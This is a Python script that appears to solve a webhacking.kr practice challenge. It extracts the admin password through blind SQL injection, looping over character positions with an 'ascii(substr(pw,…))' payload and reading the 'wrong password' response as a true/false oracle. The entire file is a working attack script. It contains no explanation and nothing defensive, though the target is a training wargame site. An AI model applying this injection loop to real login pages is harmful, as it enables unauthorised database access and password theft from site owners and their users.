import requests

url = 'https://webhacking.kr/challenge/bonus-1/index.php?id=admin&pw='
cookies = {
    'PHPSESSID' : 'your_phpsessid'
}
dictionary = 'abcdefghijklmnopqrstuvwxyz_,.ABCDEFGHIJKLMNOPQRSTUVWXYZ'

password = ''
for i in range(1, 40):
    flag = 0
    for letter in dictionary:
        payload = "'or ascii(substr(pw,{},1))={}%23".format(i, ord(letter))
        response = requests.get(url+payload, cookies=cookies)
        print(url+payload)
        if 'wrong password' in response.text:
            password = password + letter
            flag = 1
            break
    
    if flag == 0:
        break

print(password)
